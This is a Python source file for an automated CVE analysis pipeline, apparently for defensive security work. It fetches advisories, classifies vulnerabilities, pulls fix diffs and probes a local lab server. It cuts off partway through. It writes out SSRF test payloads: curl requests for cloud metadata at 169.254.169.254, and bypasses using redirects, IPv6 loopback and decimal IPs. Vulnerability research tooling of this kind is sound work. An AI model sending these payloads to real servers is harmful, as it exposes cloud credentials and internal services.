#!/usr/bin/env python3
"""
cve_pipeline.py — Automated CVE analysis orchestrator.

Chains four pipeline stages in sequence:
  1. Advisory Fetch   — pull GHSA / NVD structured data for a CVE
  2. Vuln Analysis    — classify class, unsafe patterns, fix diff
  3. Vuln Probe       — live PASS/FAIL test (SSRF, SQLi, XSS, CMDi, etc.)
  4. Report Assembly  — compile everything into a final PipelineReport

AI backend (auto-detected, no manual config needed):
  • Claude Code session  → uses `claude -p` CLI (no ANTHROPIC_API_KEY required)
  • Standalone with key  → uses pydantic-ai + Anthropic SDK directly
  • No AI available      → stages 1-4 run with text-only classification

Cache: .pipeline_cache/<CVE-ID>/<stage>.json  (TTL configurable, default 24 h)

Usage:
    python cve_pipeline.py CVE-2026-33626
    python cve_pipeline.py GHSA-6w67-hwm5-92mq
    python cve_pipeline.py CVE-2026-33626 --lab-url http://127.0.0.1:8000
    python cve_pipeline.py CVE-2026-33626 --format json --out report.json
    python cve_pipeline.py CVE-2026-33626 --no-probe --no-cache
"""

from __future__ import annotations

import argparse
import asyncio
import io
import json
import logging
import os
import re
import subprocess
import sys
import time
import traceback
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from uuid import uuid4

def _fix_stdout() -> None:
    if sys.platform == "win32" and hasattr(sys.stdout, "buffer"):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

# ── pydantic-ai (optional — used only when ANTHROPIC_API_KEY is set) ─────────
try:
    from pydantic_ai import Agent, RunContext
    from pydantic_ai.models.anthropic import AnthropicModel
    _PYDANTIC_AI = True
except ImportError:
    _PYDANTIC_AI = False
    # Define a minimal RunContext stub so tool function signatures stay valid
    class RunContext:           # type: ignore[no-redef]
        def __init__(self, deps: Any) -> None:
            self.deps = deps


class _DirectCtx:
    """
    Lightweight stand-in for pydantic_ai.RunContext used in direct (no-agent)
    pipeline mode. Provides the same `.deps` attribute the tool functions expect.
    """
    def __init__(self, deps: "PipelineDeps") -> None:
        self.deps = deps

from pydantic import BaseModel, Field
import requests

# ── local pipeline components ────────────────────────────────────────────────
_HERE = Path(__file__).parent
sys.path.insert(0, str(_HERE))
sys.path.insert(0, str(_HERE / "ssrf_lab"))

try:
    import ghsa_extractor as _extractor
except ImportError:
    _extractor = None   # advisory fetch falls back to raw HTTP

try:
    import security_diff_auditor as _auditor
except ImportError:
    _auditor = None     # diff analysis skipped when unavailable

try:
    from ssrf_lab import ssrf_probe as _probe
    from ssrf_lab.ssrf_probe import CallbackServer, LabClient, probe_mode
except (ImportError, ModuleNotFoundError):
    _probe = None       # SSRF probe skipped when unavailable

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────

_LOG_FMT = "%(asctime)s  %(levelname)-7s  %(name)s — %(message)s"
logging.basicConfig(format=_LOG_FMT, datefmt="%H:%M:%S", level=logging.INFO)
log = logging.getLogger("cve_pipeline")


# ─────────────────────────────────────────────────────────────────────────────
# File-based cache
# ─────────────────────────────────────────────────────────────────────────────

class FileCache:
    """
    Simple JSON file cache keyed by (cve_id, stage_name).
    Each entry stores the payload plus a `cached_at` ISO timestamp.
    """

    def __init__(self, root: Path, ttl_seconds: int = 86_400) -> None:
        self.root        = root
        self.ttl_seconds = ttl_seconds
        root.mkdir(parents=True, exist_ok=True)

    def _path(self, cve_id: str, stage: str) -> Path:
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", cve_id)
        d = self.root / safe
        d.mkdir(parents=True, exist_ok=True)
        return d / f"{stage}.json"

    def get(self, cve_id: str, stage: str) -> dict | None:
        p = self._path(cve_id, stage)
        if not p.exists():
            return None
        try:
            data = json.loads(p.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return None
        cached_at = data.get("_cached_at", 0)
        age = time.time() - cached_at
        if age > self.ttl_seconds:
            log.debug("Cache expired for %s/%s (age=%.0fs)", cve_id, stage, age)
            return None
        log.info("Cache hit  %-12s  stage=%s  age=%.0fs", cve_id, stage, age)
        return data.get("payload")

    def put(self, cve_id: str, stage: str, payload: dict) -> None:
        p = self._path(cve_id, stage)
        envelope = {"_cached_at": time.time(), "payload": payload}
        p.write_text(json.dumps(envelope, indent=2, ensure_ascii=False), encoding="utf-8")
        log.debug("Cached     %-12s  stage=%s  → %s", cve_id, stage, p)

    def invalidate(self, cve_id: str, stage: str) -> None:
        p = self._path(cve_id, stage)
        if p.exists():
            p.unlink()
            log.info("Invalidated cache for %s/%s", cve_id, stage)


# ─────────────────────────────────────────────────────────────────────────────
# Pydantic output models
# ─────────────────────────────────────────────────────────────────────────────

class AdvisoryResult(BaseModel):
    ghsa_id:           str | None = None
    cve_id:            str | None = None
    package_name:      str | None = None
    ecosystem:         str | None = None
    severity:          str | None = None
    cvss_score:        float | None = None
    affected_versions: list[str]  = Field(default_factory=list)
    patched_versions:  list[str]  = Field(default_factory=list)
    file_locations:    list[dict] = Field(default_factory=list)
    root_cause:        str | None = None
    references:        list[str]  = Field(default_factory=list)
    raw_description:   str | None = None


class VulnAnalysisResult(BaseModel):
    vulnerability_class: str = "UNKNOWN"
    cwe:                 str = "N/A"
    confidence:          str = "LOW"
    unsafe_patterns:     list[dict] = Field(default_factory=list)
    changed_functions:   list[str]  = Field(default_factory=list)
    fix_summary:         str = ""
    trigger_conditions:  str = ""
    diff_summary:        dict = Field(default_factory=dict)


class SSRFProbeResult(BaseModel):
    ran:                bool        = False
    skip_reason:        str | None  = None
    probe_type:         str         = ""
    vulnerable_verdict: str | None  = None
    patched_verdict:    str | None  = None
    vulnerable_detail:  str | None  = None
    patched_detail:     str | None  = None
    ssrf_confirmed:     bool        = False
    callback_port:      int | None  = None
    elapsed_s:          float | None = None
    poc_payload:        str         = ""
    curl_commands:      list[str]   = Field(default_factory=list)
    bypass_results:     list[dict]  = Field(default_factory=list)


class ExploitArtifacts(BaseModel):
    """Stage 3.5 — generated exploit PoC + minimal vulnerable target app."""
    generated:       bool = False
    skip_reason:     str  = ""
    poc_path:        str  = ""   # absolute path to poc.py
    target_app_path: str  = ""   # absolute path to target_app.py
    vuln_class:      str  = ""
    poc_summary:     str  = ""   # one-line description of what the PoC does
    iterations:      int  = 1    # generation attempt number (v0, v1, …)


class PipelineReport(BaseModel):
    """Final structured report — this is what the agent must produce."""

    pipeline_id:       str
    cve_id:            str
    generated_at:      str
    stages_completed:  list[str]  = Field(default_factory=list)
    stages_failed:     list[str]  = Field(default_factory=list)

    advisory:          AdvisoryResult     | None = None
    analysis:          VulnAnalysisResult | None = None
    ssrf_probe:        SSRFProbeResult    | None = None
    exploit_artifacts: ExploitArtifacts   | None = None

    overall_risk:      str = "UNKNOWN"   # CRITICAL | HIGH | MEDIUM | LOW | UNKNOWN
    summary:           str = ""
    recommendations:   list[str] = Field(default_factory=list)
    errors:            list[str] = Field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# Dependency injection container
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class PipelineDeps:
    cve_id:       str
    pipeline_id:  str
    cache:        FileCache
    lab_url:      str
    skip_probe:   bool
    no_cache:     bool
    errors:       list[str]    = field(default_factory=list)
    completed:    list[str]    = field(default_factory=list)
    failed:       list[str]    = field(default_factory=list)
    t_start:      float        = field(default_factory=time.monotonic)

    def elapsed(self) -> float:
        return round(time.monotonic() - self.t_start, 2)

    def record_error(self, stage: str, exc: Exception) -> None:
        msg = f"[{stage}] {type(exc).__name__}: {exc}"
        self.errors.append(msg)
        self.failed.append(stage)
        log.error(msg)


# ─────────────────────────────────────────────────────────────────────────────
# Claude Code CLI helper  (no ANTHROPIC_API_KEY needed)
# ─────────────────────────────────────────────────────────────────────────────

def _call_claude(prompt: str, timeout: int = 120) -> str:
    """
    Call `claude -p` using Claude Code's own authentication.
    No ANTHROPIC_API_KEY required — works transparently inside Claude Code sessions.
    Falls back gracefully if claude CLI is not available.
    """
    try:
        result = subprocess.run(
            ["claude", "-p", prompt, "--output-format", "text"],
            capture_output=True, text=True, timeout=timeout,
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        log.debug("claude -p non-zero exit: %s", result.stderr[:200])
    except FileNotFoundError:
        log.debug("claude CLI not found — AI enhancement skipped")
    except subprocess.TimeoutExpired:
        log.debug("claude -p timed out after %ds", timeout)
    except Exception as exc:
        log.debug("claude -p error: %s", exc)
    return ""


def _claude_available() -> bool:
    """Return True if the `claude` CLI is reachable."""
    try:
        r = subprocess.run(["claude", "--version"],
                           capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────────────────
# pydantic-ai agent
# ─────────────────────────────────────────────────────────────────────────────

_SYSTEM_PROMPT = """
You are a CVE analysis pipeline orchestrator for a defensive security team.
You work with ANY CVE — not just SSRF. The pipeline handles all vulnerability
classes: SSRF, SQLi, XSS, path traversal, command injection, deserialization, etc.

Your job is to analyse a CVE by calling the four available tools **in order**:
  1. fetch_advisory        — retrieve structured advisory data (GHSA / NVD)
  2. analyze_vulnerability — classify the vuln class, fetch real code diff if
                             a GitHub commit reference exists in the advisory
  3. run_vuln_probe        — run the appropriate probe for the detected vuln class
  4. compile_report        — assemble everything into the final PipelineReport

Rules:
- Always call fetch_advisory first with the CVE or GHSA ID provided.
- Always call analyze_vulnerability after fetch_advisory, regardless of result.
- Always call run_vuln_probe with the vulnerability_class from Step 2.
  Pass code_before and code_after from the analysis diff_summary if available.
  The probe automatically dispatches to the right test:
    SSRF              → live callback probe against the lab server
    SQL Injection     → parameterised vs raw query analysis
    OS Command Inject → shell=True / os.system pattern detection
    Path Traversal    → sandbox escape test
    XSS               → unescaped output sink detection
    Deserialization   → pickle/yaml.load pattern detection
    Others            → static analysis + PoC payload generation
- Always call compile_report last.
- Never invent data not returned by a tool. Use null for unknown fields.
- For overall_risk: map CVSS ≥9 → CRITICAL, ≥7 → HIGH, ≥4 → MEDIUM, else LOW.
- The pipeline is generic — it works for any CVE from any ecosystem.
""".strip()

def _make_agent(api_key: str) -> "Agent[PipelineDeps, PipelineReport]":
    """
    Build the pydantic-ai agent at runtime (deferred so the API key exists).
    Tool functions are defined at module level and registered here.
    """
    from pydantic_ai.providers.anthropic import AnthropicProvider
    provider = AnthropicProvider(api_key=api_key)
    model    = AnthropicModel("claude-sonnet-4-6", provider=provider)
    agent: Agent[PipelineDeps, PipelineReport] = Agent(
        model         = model,
        deps_type     = PipelineDeps,
        result_type   = PipelineReport,
        system_prompt = _SYSTEM_PROMPT,
    )
    # Register tools programmatically (avoids module-level agent construction)
    agent.tool(fetch_advisory)
    agent.tool(analyze_vulnerability)
    agent.tool(run_vuln_probe)
    agent.tool(compile_report)
    return agent


# ─────────────────────────────────────────────────────────────────────────────
# Tool 1 — Advisory fetch
# ─────────────────────────────────────────────────────────────────────────────


def fetch_advisory(ctx: RunContext[PipelineDeps], cve_or_ghsa_id: str) -> dict:
    """
    Fetch structured advisory data from the GitHub Advisory Database or NVD.
    Returns an AdvisoryResult-shaped dict. Caches result for 24 h.
    """
    deps  = ctx.deps
    stage = "1_advisory"
    cve_id = deps.cve_id

    if not deps.no_cache:
        cached = deps.cache.get(cve_id, stage)
        if cached:
            deps.completed.append(stage)
            return cached

    log.info("[Stage 1] Fetching advisory for %s …", cve_or_ghsa_id)

    result: dict = {}
    try:
        # ── GitHub Advisory path ──────────────────────────────────────────
        if _extractor and re.match(r"GHSA-", cve_or_ghsa_id, re.I):
            url = f"https://github.com/advisories/{cve_or_ghsa_id.upper()}"
            raw = _extractor.parse_github_advisory(url)
        elif _extractor and re.match(r"CVE-", cve_or_ghsa_id, re.I):
            # Try to find the GHSA ID via GitHub search API first
            ghsa_id = _resolve_ghsa_from_cve(cve_or_ghsa_id)
            if ghsa_id:
                url = f"https://github.com/advisories/{ghsa_id}"
                raw = _extractor.parse_github_advisory(url)
            else:
                # Fall back to NVD
                nvd_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_or_ghsa_id}"
                raw = _extractor.parse_nvd_json(nvd_url)
        else:
            # Bare HTTP fallback — query NVD directly
            raw = _nvd_fallback(cve_or_ghsa_id)

        advisory = raw if _extractor else _nvd_fallback(cve_or_ghsa_id)
        result = {
            "ghsa_id":           advisory.get("advisory", {}).get("ghsa_id"),
            "cve_id":            advisory.get("advisory", {}).get("cve_id") or cve_id,
            "package_name":      advisory.get("package",  {}).get("name"),
            "ecosystem":         advisory.get("package",  {}).get("ecosystem"),
            "severity":          advisory.get("advisory", {}).get("severity"),
            "cvss_score":        advisory.get("advisory", {}).get("cvss_score"),
            "affected_versions": advisory.get("versions", {}).get("affected", []),
            "patched_versions":  advisory.get("versions", {}).get("patched",  []),
            "file_locations":    advisory.get("vulnerability", {}).get("file_locations", []),
            "root_cause":        advisory.get("vulnerability", {}).get("root_cause"),
            "references":        advisory.get("remediation", {}).get("references", []),
            "raw_description":   advisory.get("raw_description"),
        }
        log.info("[Stage 1] Advisory fetched — pkg=%s  severity=%s",
                 result.get("package_name"), result.get("severity"))
    except Exception as exc:
        deps.record_error(stage, exc)
        result = {"cve_id": cve_id, "_error": str(exc)}

    if not deps.no_cache and "_error" not in result:
        deps.cache.put(cve_id, stage, result)
    deps.completed.append(stage)
    return result


def _resolve_ghsa_from_cve(cve_id: str) -> str | None:
    """Ask the GitHub Advisory GraphQL API to map a CVE ID to its GHSA ID."""
    token = os.environ.get("GITHUB_TOKEN", "")
    try:
        resp = requests.post(
            "https://api.github.com/graphql",
            json={"query": f"""{{
              securityAdvisories(identifier: {{type: CVE, value: "{cve_id}"}}, first: 1) {{
                nodes {{ ghsaId }}
              }}
            }}"""},
            headers={
                "Authorization": f"Bearer {token}" if token else "",
                "User-Agent": "cve-pipeline/1.0",
            },
            timeout=10,
        )
        nodes = resp.json().get("data", {}).get("securityAdvisories", {}).get("nodes", [])
        return nodes[0]["ghsaId"] if nodes else None
    except Exception:
        return None


def _nvd_fallback(cve_id: str) -> dict:
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
    resp = requests.get(url, headers={"User-Agent": "cve-pipeline/1.0"}, timeout=15)
    resp.raise_for_status()
    vulns = resp.json().get("vulnerabilities", [])
    if not vulns:
        return {"advisory": {}, "package": {}, "versions": {}, "vulnerability": {},
                "remediation": {}, "raw_description": ""}
    cve = vulns[0].get("cve", {})
    descs = cve.get("descriptions", [])
    desc = next((d["value"] for d in descs if d.get("lang") == "en"), "")
    metrics = cve.get("metrics", {})
    score, sev = None, None
    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
        if key in metrics and metrics[key]:
            m = metrics[key][0]
            score = m.get("cvssData", {}).get("baseScore")
            sev   = m.get("cvssData", {}).get("baseSeverity") or m.get("baseSeverity")
            break
    refs = [r["url"] for r in cve.get("references", []) if "url" in r]
    return {
        "advisory": {"cve_id": cve.get("id"), "severity": sev, "cvss_score": score},
        "package":  {},
        "versions": {},
        "vulnerability": {"root_cause": desc[:600] if desc else None},
        "remediation": {"references": refs[:10]},
        "raw_description": desc[:1500],
    }


# ─────────────────────────────────────────────────────────────────────────────
# Tool 2 — Vulnerability analysis
# ─────────────────────────────────────────────────────────────────────────────


def analyze_vulnerability(
    ctx: RunContext[PipelineDeps],
    advisory_json: str,
) -> dict:
    """
    Classify the vulnerability, identify unsafe code patterns, and describe
    the fix (if diff auditor is available). Returns a VulnAnalysisResult dict.
    """
    deps  = ctx.deps
    stage = "2_analysis"
    cve_id = deps.cve_id

    if not deps.no_cache:
        cached = deps.cache.get(cve_id, stage)
        if cached:
            deps.completed.append(stage)
            return cached

    log.info("[Stage 2] Analysing vulnerability patterns …")
    result: dict = {}

    try:
        advisory: dict = json.loads(advisory_json) if isinstance(advisory_json, str) else advisory_json

        if _auditor:
            # Try to fetch real before/after code from GitHub commit references.
            # This makes the diff auditor work for ANY CVE, not just the
            # hardcoded lmdeploy SSRF example.
            references = advisory.get("references", [])
            code_diff = _fetch_github_code_diff(references)

            if code_diff:
                src_a, src_b, filename = code_diff
                label_a = f"vulnerable ({filename})"
                label_b = f"patched    ({filename})"
            else:
                # No commit link found — fall back to advisory text classification
                vuln_class = _infer_vuln_class(advisory)
                if "ssrf" in vuln_class.lower() and hasattr(_auditor, "VERSION_A"):
                    # Last resort: use the embedded lmdeploy demo only for SSRF
                    src_a, src_b = _auditor.VERSION_A, _auditor.VERSION_B
                    label_a, label_b = "vulnerable (pre-patch)", "patched"
                else:
                    src_a, src_b = "", ""
                    label_a, label_b = "version_a", "version_b"

            report = _auditor.build_report(
                label_a=label_a, label_b=label_b,
                src_a=src_a, src_b=src_b,
            )
            result = {
                "vulnerability_class": report.vulnerability_class,
                "cwe":                 report.cwe,
                "confidence":          report.confidence,
                "unsafe_patterns":     report.unsafe_patterns,
                "changed_functions":   report.changed_functions,
                "fix_summary":         report.fix_description.get("summary") or "",
                "trigger_conditions":  report.trigger_conditions,
                "diff_summary":        report.diff_summary,
            }
        else:
            # Lightweight fallback: classify from the advisory description alone
            desc = advisory.get("raw_description", "") or ""
            vuln_class, cwe = _classify_from_text(desc)
            result = {
                "vulnerability_class": vuln_class,
                "cwe":                 cwe,
                "confidence":          "MEDIUM",
                "unsafe_patterns":     [],
                "changed_functions":   [],
                "fix_summary":         advisory.get("root_cause") or "",
                "trigger_conditions":  _trigger_from_class(vuln_class),
                "diff_summary":        {},
            }

        log.info("[Stage 2] Class=%s  CWE=%s  confidence=%s",
                 result["vulnerability_class"], result["cwe"], result["confidence"])
    except Exception as exc:
        deps.record_error(stage, exc)
        result = {"vulnerability_class": "UNKNOWN", "cwe": "N/A",
                  "confidence": "LOW", "_error": str(exc)}

    if not deps.no_cache and "_error" not in result:
        deps.cache.put(cve_id, stage, result)
    deps.completed.append(stage)
    return result


def _fetch_github_code_diff(references: list[str]) -> tuple[str, str, str] | None:
    """
    Resolve any GitHub reference URL to a commit SHA, then download the
    before/after versions of the most relevant changed file.

    Handles all reference types found in GHSA and NVD advisories:
      - /commit/SHA           direct commit link
      - /pull/NUM             PR → merge_commit_sha via GitHub API
      - /compare/TAG1...TAG2  compare view → head commit of the range
      - /releases/tag/TAG     release tag → tag's commit SHA

    Returns (code_before, code_after, filename) or None if not found.
    """
    _GH_RE = {
        "commit":  re.compile(r"github\.com/([^/\s]+/[^/\s]+)/commit/([a-f0-9]{7,40})", re.I),
        "pull":    re.compile(r"github\.com/([^/\s]+/[^/\s]+)/pull/(\d+)", re.I),
        "compare": re.compile(r"github\.com/([^/\s]+/[^/\s]+)/compare/([^#\s]+)", re.I),
        "release": re.compile(r"github\.com/([^/\s]+/[^/\s]+)/releases/tag/([^#\s/]+)", re.I),
    }

    headers: dict = {
        "Accept":     "application/vnd.github+json",
        "User-Agent": "cve-pipeline/1.0",
    }
    token = os.environ.get("GITHUB_TOKEN", "")
    if token:
        headers["Authorization"] = f"Bearer {token}"

    def _gh_get(url: str) -> dict:
        r = requests.get(url, headers=headers, timeout=12)
        r.raise_for_status()
        return r.json()

    def _resolve_to_sha(ref: str) -> tuple[str, str] | None:
        """Return (repo, sha) for a GitHub reference URL, or None."""
        # 1. Direct commit
        m = _GH_RE["commit"].search(ref)
        if m:
            return m.group(1), m.group(2)

        # 2. Pull request → merge commit
        m = _GH_RE["pull"].search(ref)
        if m:
            repo, pr_num = m.group(1), m.group(2)
            try:
                pr = _gh_get(f"https://api.github.com/repos/{repo}/pulls/{pr_num}")
                sha = pr.get("merge_commit_sha") or pr.get("head", {}).get("sha")
                if sha:
                    return repo, sha
            except Exception as e:
                log.debug("PR resolve failed %s#%s: %s", repo, pr_num, e)
            return None

        # 3. Compare view (e.g. v1.0...v1.1) → head commit of range
        m = _GH_RE["compare"].search(ref)
        if m:
            repo, compare = m.group(1), m.group(2)
            try:
                data = _gh_get(f"https://api.github.com/repos/{repo}/compare/{compare}")
                sha = data.get("head_commit", {}).get("sha") or \
                      data.get("commits", [{}])[-1].get("sha")
                if sha:
                    return repo, sha
            except Exception as e:
                log.debug("Compare resolve failed %s %s: %s", repo, compare, e)
            return None

        # 4. Release tag → commit SHA
        m = _GH_RE["release"].search(ref)
        if m:
            repo, tag = m.group(1), m.group(2)
            try:
                tag_data = _gh_get(f"https://api.github.com/repos/{repo}/git/ref/tags/{tag}")
                obj = tag_data.get("object", {})
                sha = obj.get("sha", "")
                # Annotated tags point to a tag object, not a commit directly
                if obj.get("type") == "tag":
                    tag_obj = _gh_get(f"https://api.github.com/repos/{repo}/git/tags/{sha}")
                    sha = tag_obj.get("object", {}).get("sha", sha)
                if sha:
                    return repo, sha
            except Exception as e:
                log.debug("Release tag resolve failed %s %s: %s", repo, tag, e)
            return None

        return None

    def _download_file_versions(repo: str, sha: str) -> tuple[str, str, str] | None:
        """Fetch before/after versions of the most relevant file in a commit."""
        try:
            commit_data = _gh_get(f"https://api.github.com/repos/{repo}/commits/{sha}")
        except Exception as e:
            log.debug("Commit detail fetch failed %s@%s: %s", repo, sha[:8], e)
            return None

        changed = commit_data.get("files", [])
        # Prefer source files over config/docs; within source, prefer Python
        _SRC_EXT = (".py", ".js", ".ts", ".java", ".go", ".rb", ".php",
                    ".c", ".cpp", ".rs", ".cs")
        src = [f for f in changed if f.get("filename", "").endswith(_SRC_EXT)]
        py  = [f for f in src if f.get("filename", "").endswith(".py")]
        target = (py or src or changed)[:1]
        if not target:
            return None

        filename = target[0]["filename"]
        parents  = commit_data.get("parents", [])
        parent_sha = parents[0]["sha"] if parents else None
        raw_base = f"https://raw.githubusercontent.com/{repo}"

        code_before, code_after = "", ""
        try:
            if parent_sha:
                r = requests.get(f"{raw_base}/{parent_sha}/{filename}", timeout=12)
                if r.status_code == 200:
                    code_before = r.text
            r = requests.get(f"{raw_base}/{sha}/{filename}", timeout=12)
            if r.status_code == 200:
                code_after = r.text
        except Exception as e:
            log.debug("Raw file download failed: %s", e)

        if code_before or code_after:
            return code_before, code_after, filename
        return None

    # ── Walk references in priority order: commit > PR > compare > release ──
    priority = ["commit", "pull", "compare", "release"]
    buckets: dict[str, list[str]] = {k: [] for k in priority}
    for ref in references:
        for kind in priority:
            if _GH_RE[kind].search(ref):
                buckets[kind].append(ref)
                break

    for kind in priority:
        for ref in buckets[kind]:
            resolved = _resolve_to_sha(ref)
            if not resolved:
                continue
            repo, sha = resolved
            result = _download_file_versions(repo, sha)
            if result:
                code_before, code_after, filename = result
                log.info("[Stage 2] Fetched real code diff from %s @ %s (%s) via %s ref",
                         repo, sha[:8], filename, kind)
                return code_before, code_after, filename

    log.info("[Stage 2] No GitHub code diff found in references — using text classification")
    return None


def _infer_vuln_class(advisory: dict) -> str:
    text = (advisory.get("raw_description") or "").lower()
    if "ssrf" in text or "server-side request forgery" in text:
        return "Server-Side Request Forgery (SSRF)"
    if "sql injection" in text or "sqli" in text:
        return "SQL Injection"
    if "command injection" in text or "os command" in text:
        return "OS Command Injection"
    if "path traversal" in text or "directory traversal" in text:
        return "Path Traversal"
    if "xss" in text or "cross-site scripting" in text:
        return "Cross-Site Scripting (XSS)"
    if "deserialization" in text or "pickle" in text:
        return "Insecure Deserialization"
    return "UNKNOWN"


def _classify_from_text(text: str) -> tuple[str, str]:
    t = text.lower()
    checks = [
        ("ssrf", "Server-Side Request Forgery (SSRF)", "CWE-918"),
        ("server-side request forgery", "Server-Side Request Forgery (SSRF)", "CWE-918"),
        ("sql injection", "SQL Injection", "CWE-89"),
        ("os command", "OS Command Injection", "CWE-78"),
        ("command injection", "OS Command Injection", "CWE-78"),
        ("path traversal", "Path Traversal", "CWE-22"),
        ("directory traversal", "Path Traversal", "CWE-22"),
        ("cross-site scripting", "Cross-Site Scripting (XSS)", "CWE-79"),
        ("deserialization", "Insecure Deserialization", "CWE-502"),
        ("xxe", "XML External Entity (XXE) Injection", "CWE-611"),
        ("race condition", "Race Condition", "CWE-362"),
        ("use-after-free", "Use After Free", "CWE-416"),
        ("buffer overflow", "Buffer Overflow", "CWE-121"),
    ]
    for kw, name, cwe in checks:
        if kw in t:
            return name, cwe
    return "UNKNOWN", "N/A"


def _trigger_from_class(vuln_class: str) -> str:
    mapping = {
        "Server-Side Request Forgery":
            "Attacker supplies a user-controlled URL pointing to an internal address "
            "(e.g. 169.254.169.254) which the server fetches without IP validation.",
        "SQL Injection":
            "Attacker injects SQL metacharacters into user-controlled input that is "
            "concatenated directly into a SQL query string.",
        "OS Command Injection":
            "Attacker injects shell metacharacters (;, |, $()) into input passed to "
            "os.system() or subprocess with shell=True.",
        "Path Traversal":
            "Attacker supplies '../' sequences in a filename parameter to escape the "
            "intended directory and read or write arbitrary files.",
    }
    for key, desc in mapping.items():
        if key.lower() in vuln_class.lower():
            return desc
    return "Refer to the advisory description for trigger conditions."


# ─────────────────────────────────────────────────────────────────────────────
# Tool 3 — Generic vulnerability probe (dispatches by vuln class)
# ─────────────────────────────────────────────────────────────────────────────

def run_vuln_probe(
    ctx: RunContext[PipelineDeps],
    vulnerability_class: str,
    code_before: str = "",
    code_after:  str = "",
) -> dict:
    """
    Run the appropriate probe for the detected vulnerability class.

    Dispatches to:
      SSRF              → live callback probe against the lab server
      SQL Injection     → payload injection test against parameterised vs raw query
      OS Command Inject → static + runtime shell-escape test
      Path Traversal    → sandbox escape test using a temp directory
      XSS               → unescaped output detection in rendered HTML
      Deserialization   → unsafe pickle/yaml.load pattern detection
      Others            → static code pattern analysis + PoC payload generation

    Returns a ProbeResult-shaped dict with:
      ran, probe_type, vulnerable_verdict, patched_verdict,
      confirmed, poc_payload, detail, elapsed_s
    """
    deps   = ctx.deps
    stage  = "3_vuln_probe"
    cve_id = deps.cve_id

    if not deps.no_cache:
        cached = deps.cache.get(cve_id, stage)
        if cached:
            deps.completed.append(stage)
            return cached

    if deps.skip_probe:
        result = {"ran": False, "skip_reason": "--no-probe flag set",
                  "probe_type": "skipped"}
        deps.completed.append(stage)
        return result

    t0    = time.monotonic()
    vc    = vulnerability_class.lower()
    result: dict = {}

    log.info("[Stage 3] Running %s probe …", vulnerability_class)

    # ── SSRF ─────────────────────────────────────────────────────────────────
    if "ssrf" in vc or "server-side request forgery" in vc:
        result = _probe_ssrf(deps)

    # ── SQL Injection ─────────────────────────────────────────────────────────
    elif "sql" in vc:
        result = _probe_sqli(code_before, code_after)

    # ── OS Command Injection ──────────────────────────────────────────────────
    elif "command" in vc or "os command" in vc:
        result = _probe_cmdi(code_before, code_after)

    # ── Path Traversal ────────────────────────────────────────────────────────
    elif "path traversal" in vc or "directory traversal" in vc:
        result = _probe_path_traversal(code_before, code_after)

    # ── XSS ──────────────────────────────────────────────────────────────────
    elif "xss" in vc or "cross-site scripting" in vc:
        result = _probe_xss(code_before, code_after)

    # ── Insecure Deserialization ──────────────────────────────────────────────
    elif "deserializ" in vc or "pickle" in vc:
        result = _probe_deserialization(code_before, code_after)

    # ── Fallback: static pattern analysis ────────────────────────────────────
    else:
        result = _probe_static_generic(vulnerability_class, code_before, code_after)

    result["probe_type"]     = vulnerability_class
    result["elapsed_s"]      = round(time.monotonic() - t0, 2)
    result.setdefault("ran", True)
    result.setdefault("curl_commands",  [])
    result.setdefault("bypass_results", [])

    log.info("[Stage 3] probe_type=%s  confirmed=%s  elapsed=%.1fs",
             vulnerability_class, result.get("confirmed"), result["elapsed_s"])

    if not deps.no_cache and "_error" not in result:
        deps.cache.put(cve_id, stage, result)
    deps.completed.append(stage)
    return result


# ── probe implementations ─────────────────────────────────────────────────────

def _probe_ssrf(deps: "PipelineDeps") -> dict:
    """
    Live SSRF probe + bypass tests against the lab server.
    Tests vulnerable and patched modes, then tries real bypass techniques
    against patched to confirm whether the patch is bypass-resistant.
    """
    lab_url = deps.lab_url

    curl_base = [
        f'# Basic SSRF test — internal metadata',
        f'curl -s -X POST "{lab_url}/fetch" \\',
        f'  -H "Content-Type: application/json" \\',
        f'  -d \'{{"url":"http://169.254.169.254/latest/meta-data/"}}\'',
        f'',
        f'# Switch to vulnerable mode first',
        f'curl -s -X PUT "{lab_url}/mode" \\',
        f'  -H "Content-Type: application/json" -d \'{{"mode":"vulnerable"}}\'',
        f'',
        f'# Switch to patched mode',
        f'curl -s -X PUT "{lab_url}/mode" \\',
        f'  -H "Content-Type: application/json" -d \'{{"mode":"patched"}}\'',
        f'',
        f'# Switch to hardened mode',
        f'curl -s -X PUT "{lab_url}/mode" \\',
        f'  -H "Content-Type: application/json" -d \'{{"mode":"hardened"}}\'',
    ]

    if _probe is None:
        return {
            "ran": False,
            "skip_reason": "ssrf_lab not importable",
            "curl_commands": curl_base,
            "bypass_results": _theoretical_ssrf_bypasses(lab_url),
        }

    try:
        lab = LabClient(lab_url)
        if not lab.ping():
            return {
                "ran": False,
                "skip_reason": f"Lab server not reachable at {lab_url}",
                "curl_commands": curl_base,
                "bypass_results": _theoretical_ssrf_bypasses(lab_url),
            }

        with CallbackServer() as cb:
            port = cb.port
            vuln_r    = probe_mode(lab, "vulnerable", cb, wait_s=4.0)
            patched_r = probe_mode(lab, "patched",    cb, wait_s=4.0)
            bypass_rs = _live_ssrf_bypasses(lab_url, port)

        curl_commands = curl_base + [
            f'',
            f'# Redirect bypass attempt against patched',
            f'curl -s -X POST "{lab_url}/fetch" \\',
            f'  -H "Content-Type: application/json" \\',
            f'  -d \'{{"url":"https://httpbin.org/redirect-to?url=http://127.0.0.1:{port}/redirect-probe&status_code=302"}}\'',
            f'',
            f'# IPv6 loopback bypass',
            f'curl -s -X POST "{lab_url}/fetch" \\',
            f'  -H "Content-Type: application/json" \\',
            f'  -d \'{{"url":"http://[::1]:{port}/ipv6-probe"}}\'',
            f'',
            f'# Decimal IP bypass (127.0.0.1 = 2130706433)',
            f'curl -s -X POST "{lab_url}/fetch" \\',
            f'  -H "Content-Type: application/json" \\',
